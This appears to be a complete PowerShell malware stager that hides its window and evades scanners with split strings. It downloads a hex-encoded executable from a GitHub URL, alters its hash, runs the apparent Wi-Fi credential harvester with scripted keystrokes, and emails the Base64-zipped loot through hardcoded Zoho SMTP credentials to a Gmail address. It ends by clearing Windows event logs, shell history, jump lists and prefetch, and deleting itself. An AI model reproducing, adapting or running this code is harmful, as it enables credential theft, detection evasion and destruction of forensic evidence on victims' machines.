try {
    # --- STAGE 1: ENVIRONMENT PREPARATION & EVASION ---

    # Import Win32 API to hide the PowerShell window from the user's desktop
    $v_ms = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $v_type = Add-Type -MemberDefinition $v_ms -Name ("W32S" + (Get-Random)) -Namespace "W3" -PassThru

    # Load .NET assemblies for ZIP compression (required for Stage 5)
    Add-Type -AssemblyName "System.IO.Compression"
    Add-Type -AssemblyName "System.IO.Compression.FileSystem"

    # Execute the hide command (nCmdShow = 0 is SW_HIDE)
    $v_type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

    # Obfuscate .NET Class names by fragmenting strings to evade simple keyword scanners
    $v_sc = ("Net.M" + "ail.Smtp" + "Client")
    $v_mm = ("Net.M" + "ail.Mail" + "Message")

    # --- STAGE 2: EXFILTRATION FUNCTION ---
    function Send-V-Mail {
        param($sb, $at)
        $u = "zqrvstef0rc5edk@zohomail.com"
        $p = "LHjzKTbzDApt" # Credential storage

        try {
            $m = New-Object $v_mm
            $m.From = "Ang Mangagawa <$u>"
            $m.To.Add("srve650@gmail.com")
            $m.Subject = $sb
            $m.Body = "Ang iyong mga aanihin."
            if ($at) { $m.Attachments.Add($at) }

            # Configure SMTP with SSL on Port 587
            $c = New-Object $v_sc("smtp.zoho.com", 587)
            $c.EnableSsl = $true
            $c.Timeout = 15000
            $c.Credentials = New-Object System.Net.NetworkCredential($u, $p)
            
            Write-Output "Sending encoded data..."
            $c.Send($m)
            Write-Output "Success!"
        }
        catch {
            Write-Output "SMTP Error: $($_.Exception.Message)"
        }
        finally {
            # Ensure memory is released
            if ($m) { $m.Dispose() }
            if ($c) { $c.Dispose() }
        }
    }

    # --- STAGE 3: PAYLOAD DOWNLOAD & POLYMORPHISM ---
    
    # Download hex-encoded executable data from remote source
    $u_url = ("ht" + "tps://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt")
    $r_nm = -join ((97..122) | Get-Random -Count 5 | % {[char]$_})
    $v_txt = "$env:TEMP\$r_nm.txt"
    $v_exe = "$env:TEMP\$r_nm.exe"

    Invoke-WebRequest -Uri $u_url -OutFile $v_txt

    # Convert Hex text back into a binary Byte Array
    $h_data = Get-Content $v_txt -Raw
    $b_data = [byte[]]::new($h_data.Length / 2)
    for ($i = 0; $i -lt $h_data.Length; $i += 2) {
        $b_data[$i / 2] = [convert]::ToByte($h_data.Substring($i, 2), 16)
    }

    # HASH RANDOMIZATION: Append random junk bytes to change the SHA-256 signature
    $v_junk_size = Get-Random -Minimum 100 -Maximum 300
    $v_junk = New-Object byte[] $v_junk_size
    (New-Object System.Random).NextBytes($v_junk)
    $v_final_bytes = $b_data + $v_junk

    # Write the randomized binary to the Temp folder
    [System.IO.File]::WriteAllBytes($v_exe, $v_final_bytes)

    # --- STAGE 4: EXECUTION & UI AUTOMATION ---
    
    # Start the harvester process and keep a reference to it
    $v_p = Start-Process $v_exe -PassThru
    $v_out = "$env:TEMP\ani_$r_nm.txt"

    Start-Sleep -Seconds 2
    Add-Type -AssemblyName ("System.Win" + "dows.Forms") # Load SendKeys library
    
    # Bring the harvester window into focus using WScript.Shell
    $ws = New-Object -ComObject WScript.Shell
    $ws.AppActivate($v_p.Id)
    Start-Sleep -Milliseconds 500

    # Automate keystrokes: Select All (Ctrl+A), Save As (Ctrl+S), Type Path, Enter
    [System.Windows.Forms.SendKeys]::SendWait("^(a)")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("^(s)")
    Start-Sleep -Seconds 2 
    [System.Windows.Forms.SendKeys]::SendWait("$v_out")
    Start-Sleep -Milliseconds 500
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
    Start-Sleep -Milliseconds 500

    # Terminate the harvester process once the file is saved
    if ($v_p) { Stop-Process -Id $v_p.Id -Force }
    
    # --- STAGE 5: DATA WRAPPING & EXFILTRATION ---
    if (Test-Path $v_out) {
        Add-Type -AssemblyName "System.IO.Compression"
        
        $r_raw = Get-Content $v_out -Raw
        $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
        
        # Obfuscate the harvested data using Base64
        $v_bytes  = [System.Text.Encoding]::UTF8.GetBytes($r_raw)
        $v_base64 = [System.Convert]::ToBase64String($v_bytes)

        # Create an in-memory ZIP archive to avoid writing a second file to disk
        $ms = New-Object System.IO.MemoryStream
        
        $zip = New-Object System.IO.Compression.ZipArchive($ms, [System.IO.Compression.ZipArchiveMode]::Create, $true)
        
        $entry = $zip.CreateEntry("anihan.txt")
        $writer = New-Object System.IO.StreamWriter($entry.Open())
        $writer.Write($v_base64)
        
        $writer.Dispose()
        $zip.Dispose()
        
        # Rewind the stream to the beginning for the attachment reader
        $ms.Position = 0
        
        # Attach the memory-based ZIP to the email and send
        $v_at = New-Object Net.Mail.Attachment($ms, "report_archived.zip")
        Send-V-Mail -sb "Ang pagaani sa bukirin - $currentDate" -at $v_at
        
        $v_at.Dispose()
        $ms.Dispose()
    }

    # Standard cleanup of files created during the try block
    Remove-Item $v_txt, $v_exe, $v_out -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Warning "Critical Error: $($_.Exception.Message)"
}

# finally {
#     # --- STAGE 6: AGGRESSIVE ANTI-FORENSICS & LOG WIPING ---
    
#     # 1. Clear the PowerShell Script Block Logs (where the code is recorded)
#     # This targets the specific log where AMSI and PowerShell record your script
#     try {
#         $v_logName = "Microsoft-Windows-PowerShell/Operational"
#         [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
#     } catch { }

#     # 2. Clear System, Security, and Application Logs
#     # This is the "Nuclear Option" that wipes the main Windows history
#     $v_logs = @("System", "Application", "Security")
#     foreach ($v_log in $v_logs) {
#         try {
#             Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
#         } catch { }
#     }

#     # 3. Wipe Temp Files (Lab Patterns)
#     # Targeted wiping of any remaining lab files in TEMP using filename patterns
#     Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
#         Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
#         Remove-Item -Force -ErrorAction SilentlyContinue

#     # 4. SELF-DESTRUCT (Script Deletion)
#     $v_currentScript = $MyInvocation.MyCommand.Definition
#     if ($v_currentScript) {
#         # 'timeout 3' gives PowerShell time to close the file handle
#         # 'taskkill' ensures no leftover powershell processes keep a lock
#         $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
#         Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
#     }
# }

finally {
    # --- STAGE 6: AGGRESSIVE ANTI-FORENSICS & ARTIFACT WIPE ---

    # 1. LOG WIPING (Event Viewer)
    # Clear PowerShell Operational logs (Script Block Logging/AMSI records)
    try {
        $v_logName = "Microsoft-Windows-PowerShell/Operational"
        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
    } catch { }

    # Clear primary Windows logs (System, Security, Application) - Requires Admin
    $v_logs = @("System", "Application", "Security")
    foreach ($v_log in $v_logs) {
        try { Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue } catch { }
    }

    # 2. SHELL & COMMAND HISTORY (Registry and Jump Lists)
    # Clear Windows Run Dialog (Win+R) MRU History
    $v_runRegistry = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $v_runRegistry) {
        Remove-ItemProperty -Path $v_runRegistry -Name * -ErrorAction SilentlyContinue
    }

    # Clear PowerShell Persistent History File (PSReadline)
    try {
        $v_hPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $v_hPath) { Clear-Content $v_hPath -Force }
    } catch { }

    # Clear Taskbar Jump Lists (Recent Items)
    $v_jumpList = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
    if (Test-Path $v_jumpList) {
        Get-ChildItem $v_jumpList -Filter "*.automaticDestinations-ms" | Remove-Item -Force -ErrorAction SilentlyContinue
    }

    # 3. FILE SYSTEM CLEANUP (Temp Folder)
    # Wipe specific lab patterns from the TEMP directory
    Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
        Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
        Remove-Item -Force -ErrorAction SilentlyContinue

    # 4. SELF-DESTRUCT & SESSION TERMINATION
    # Clear current session memory history
    Clear-History -ErrorAction SilentlyContinue

    $v_currentScript = $MyInvocation.MyCommand.Definition
    if ($v_currentScript) {
        # CMD logic: Wait 3s -> Kill PS processes -> Delete the script file
        $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
        Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
    }

    # 5. PREFETCH WIPING (Execution Artifacts)
    # This removes the record that your randomized .exe was ever launched.
    try {
        $v_prefetchPath = "$env:SystemRoot\Prefetch"
        if (Test-Path $v_prefetchPath) {
            # Find any .pf file that matches your random filename pattern
            Get-ChildItem -Path $v_prefetchPath -Filter "*$r_nm*.pf" | 
                Remove-Item -Force -ErrorAction SilentlyContinue
            
            # Optionally clear the PowerShell prefetch to hide the stager execution
            Get-ChildItem -Path $v_prefetchPath -Filter "POWERSHELL.EXE*.pf" | 
                Remove-Item -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}